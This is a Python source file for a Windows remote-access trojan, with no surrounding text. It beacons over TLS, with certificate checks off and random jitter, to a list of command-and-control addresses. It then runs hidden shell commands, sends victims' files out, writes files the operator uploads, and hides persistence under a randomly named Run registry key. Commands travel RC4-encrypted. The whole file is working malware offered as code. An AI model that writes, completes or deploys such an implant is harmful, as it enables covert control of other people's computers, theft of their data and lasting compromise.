import ctypes
import socket
import subprocess
import os
import sys
import time
import base64
import threading
import random
import hashlib
import zlib
import struct
import ssl

C2_LIST = [
    "192.168.100.96",
    "192.168.100.97",
    "10.0.0.10",
    "172.16.0.5"
]

C2_PORT = 443

CMD_EXIT = 1
CMD_PING = 2
CMD_DOWNLOAD = 3
CMD_UPLOAD = 4
CMD_PERSIST = 5
CMD_PWD = 6
CMD_SHELL = 7

def get_hardware_hash():
    h = hashlib.sha256()
    try:
        vol = ctypes.c_uint32()
        ctypes.windll.kernel32.GetVolumeInformationW(ctypes.c_wchar("C:\\"), None, 0, ctypes.byref(vol), None, None, None, 0)
        h.update(str(vol.value).encode())
    except:
        pass
    try:
        import wmi
        c = wmi.WMI()
        for bios in c.Win32_BIOS():
            if bios.SerialNumber:
                h.update(bios.SerialNumber.encode())
                break
    except:
        pass
    try:
        h.update(str(os.getpid()).encode())
    except:
        pass
    return h.digest()[:32]

ENCRYPTION_KEY = get_hardware_hash()

def rc4(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray(len(data))
    for k in range(len(data)):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        result[k] = data[k] ^ S[(S[i] + S[j]) & 0xFF]
    return bytes(result)

def encrypt(data):
    comp = zlib.compress(data, 9)
    enc = rc4(comp, ENCRYPTION_KEY)
    return struct.pack(">I", len(enc)) + enc

def decrypt(data):
    if len(data) < 4:
        return None
    length = struct.unpack(">I", data[:4])[0]
    if len(data) < 4 + length:
        return None
    enc = data[4:4+length]
    dec = rc4(enc, ENCRYPTION_KEY)
    return zlib.decompress(dec)

def recv_exact(sock, n, timeout=10):
    sock.settimeout(timeout)
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("incomplete recv")
        data += chunk
    sock.settimeout(None)
    return data

def execute_cmd(cmd):
    try:
        if cmd.startswith("cd "):
            p = cmd[3:].strip()
            if not p:
                p = os.path.expanduser("~")
            try:
                os.chdir(p)
                return os.getcwd().encode()
            except:
                return b"cd_err"
        else:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd(), startupinfo=si, creationflags=0x08000000)
            out = proc.stdout.read() + proc.stderr.read()
            if not out:
                return b"ok"
            try:
                return out.decode('utf-8', errors='replace').encode()
            except:
                return out
    except:
        return b"err"

def add_persistence():
    try:
        import winreg
        p = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        rand_name = hashlib.md5(str(random.randint(1, 9999999)).encode()).hexdigest()[:16]
        winreg.SetValueEx(key, rand_name, 0, winreg.REG_SZ, f'"{p}"')
        winreg.CloseKey(key)
    except:
        pass

def connect_and_run(host):
    min_delay = 7
    max_delay = 19
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ssock = ctx.wrap_socket(sock, server_hostname=host)
            ssock.connect((host, C2_PORT))
            ssock.send(ENCRYPTION_KEY)
            try:
                ack = recv_exact(ssock, 3)
                if ack != b'ACK':
                    ssock.close()
                    jitter = random.uniform(min_delay, max_delay)
                    time.sleep(jitter)
                    continue
            except:
                ssock.close()
                jitter = random.uniform(min_delay, max_delay)
                time.sleep(jitter)
                continue
            while True:
                try:
                    header = recv_exact(ssock, 4)
                    cmd_len = struct.unpack(">I", header)[0]
                    if cmd_len > 2097152:
                        break
                    enc_cmd = recv_exact(ssock, cmd_len)
                    decrypted = decrypt(enc_cmd)
                    if decrypted is None:
                        break
                    cmd_code = struct.unpack(">I", decrypted[:4])[0]
                    payload = decrypted[4:]
                    if cmd_code == CMD_EXIT:
                        ssock.close()
                        sys.exit(0)
                    elif cmd_code == CMD_PING:
                        resp = b"pong"
                    elif cmd_code == CMD_DOWNLOAD:
                        fname = payload.decode()
                        try:
                            with open(fname, "rb") as f:
                                fdata = base64.b64encode(f.read())
                            resp = b"ok|" + fdata
                        except:
                            resp = b"err"
                    elif cmd_code == CMD_UPLOAD:
                        parts = payload.split(b"|", 1)
                        if len(parts) == 2:
                            fpath = parts[0].decode()
                            fdata = base64.b64decode(parts[1])
                            try:
                                d = os.path.dirname(fpath)
                                if d:
                                    os.makedirs(d, exist_ok=True)
                                with open(fpath, "wb") as f:
                                    f.write(fdata)
                                resp = b"ok"
                            except:
                                resp = b"err"
                        else:
                            resp = b"err"
                    elif cmd_code == CMD_PERSIST:
                        add_persistence()
                        resp = b"ok"
                    elif cmd_code == CMD_PWD:
                        resp = os.getcwd().encode()
                    elif cmd_code == CMD_SHELL:
                        cmd = payload.decode()
                        result = execute_cmd(cmd)
                        b64res = base64.b64encode(result)
                        resp = b64res + b"|" + str(len(result)).encode()
                    else:
                        resp = b"unknown"
                    ssock.send(encrypt(resp))
                except:
                    break
            ssock.close()
        except:
            pass
        jitter = random.uniform(min_delay, max_delay)
        time.sleep(jitter)

if __name__ == "__main__":
    try:
        random.shuffle(C2_LIST)
        for c2 in C2_LIST:
            t = threading.Thread(target=connect_and_run, args=(c2,))
            t.daemon = True
            t.start()
            time.sleep(2)
        while True:
            time.sleep(60)
    except:
        pass
